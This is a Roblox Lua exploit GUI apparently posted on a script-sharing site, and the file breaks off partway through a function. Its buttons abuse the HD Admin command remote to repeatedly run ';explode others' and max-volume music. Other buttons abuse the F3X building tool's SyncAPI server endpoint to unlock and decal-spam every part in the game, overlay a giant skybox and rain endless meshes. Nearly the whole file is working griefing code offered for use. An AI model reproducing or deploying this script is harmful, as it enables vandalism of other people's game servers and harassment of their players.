--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")

local LNickyz = Instance.new("ScreenGui")
LNickyz.Name = "if someone gave u dis without my permission both of you are a fucking skids"
LNickyz.Parent = player:WaitForChild("PlayerGui")
LNickyz.IgnoreGuiInset = false
LNickyz.ResetOnSpawn = false  

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 500, 0, 700) 
mainFrame.Position = UDim2.new(0.5, -300, 0.5, -225)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 3
mainFrame.BorderColor3 = Color3.new(1, 9, 0) 
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = LNickyz

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, 0, 0, 40)
titleText.Position = UDim2.new(0, 1, -0.03, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 4
titleText.BorderColor3 = Color3.new(2, 5, 5)
titleText.Font = Enum.Font.Code
titleText.Text = "LNickyTheDestroyer updated gui"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 30
titleText.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0.1, 0, 0, 30)
titleText.Position = UDim2.new(0.45, 1, 0.05, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 0
titleText.BorderColor3 = Color3.new(2, 5, 5)
titleText.Font = Enum.Font.Code
titleText.Text = "F3X Scripts"
titleText.TextColor3 = Color3.new(2, 5, 5)
titleText.TextSize = 39
titleText.Parent = mainFrame

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.10, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(2, 5, 5)
f3x.Font = Enum.Font.Arial
f3x.Text = "Noot Noot!"
f3x.TextColor3 = Color3.new(2, 5, 5)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 104576360535209")
	RequestCommand:InvokeServer(";pitch 0.2")
	RequestCommand:InvokeServer(";volume inf")
	task.wait(9)
	RequestCommand:InvokeServer(";music 236932924")
	RequestCommand:InvokeServer(";volume inf")
	task.wait(1.124)
	RequestCommand:InvokeServer(";music 1839931391")
	RequestCommand:InvokeServer(";volume inf")
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
	task.wait(2)
	RequestCommand:InvokeServer(";explode others")
end)
f3x.MouseButton1Click:Connect(function()
	task.wait(10.2)
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("382332426")

	-----------------------------------

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("382332426")

	-----------
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	-- DO NOT DELETE THIS LEAVE MY CREDIT

	-- Rain Toad Script By ItsKittyyyGD 

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function SetCollision(part, boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end

	function SetAnchor(boolean, part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function CreatePart(cf)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = workspace
		}
		_(args)
	end

	function Resize(part, size, cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://" .. texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}
		_(args)
	end

	function Sky(id)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)))
		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
				SetAnchor(true, v)
				AddMesh(v)
				SetMesh(v, "14832966960")
				SetTexture(v, id)
				MeshResize(v, Vector3.new(0, 0, 0))
			end
		end
	end

	local function createRainToads()
		while true do
			wait(0.001) -- Here they change the appearance time of the Toads or other meshes
			if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
				local hrpcf = player.Character.HumanoidRootPart.CFrame
				local x = hrpcf.x
				local z = hrpcf.z
				local randint = math.random(-600, 600)
				local randint2 = math.random(-600, 600)
				local xloc = randint + x
				local zloc = randint2 + z
				local cf = player.Character.HumanoidRootPart.CFrame.y + 400

				spawn(function()
					local newToad = CreatePart(CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)))
					for i, v in game.Workspace:GetDescendants() do
						if v.Name == "Part" and v.Parent == workspace and v.CFrame.x == math.floor(xloc) and v.CFrame.z == math.floor(zloc) then
							SetName(v, "NOOT NOOT") -- Here the name of the toad changes
							SetAnchor(false, v)
							AddMesh(v)
							Resize(v, Vector3.new(1, 1, 1), v.CFrame)
							MeshResize(v, Vector3.new(500, 500, 500))
							SetMesh(v, "111891702759441") -- Here put it A custom mesh
							SetTexture(v, "382332426") -- X2
							SetCollision(v, true)
							v.Orientation = Vector3.new(0, 0, 0)

							v.CFrame = v.CFrame + Vector3.new(0, 0, 0)

							local sound = Instance.new("Sound", v)
							sound.SoundId = "rbxassetid://153752123" -- Here the noise or another sound To the toads or other things It works when they appear 
							sound.Volume = 0
							sound.PlayOnRemove = true
							sound:Destroy()
						end
					end
				end)
			else
				wait(1)
			end
		end
	end

	coroutine.wrap(createRainToads)()

	Sky("95921788891849") -- Here they change the skybox id 

	-- Delete this if you are going to Use it in another script

	-- Obviously it has those noises because there is an official script that has it and the msg was making me lazy 

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for _, v in ipairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				spawn(function()

					SetLocked(v, false)

					for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
						SpawnDecal(v, face)
						AddDecal(v, id, face)
					end
				end)
			end
		end
	end

	while true do
		spam("382332426")
		wait(1)
	end
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.10, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "my skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("105190470033188")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.10, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "my  decalspam"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
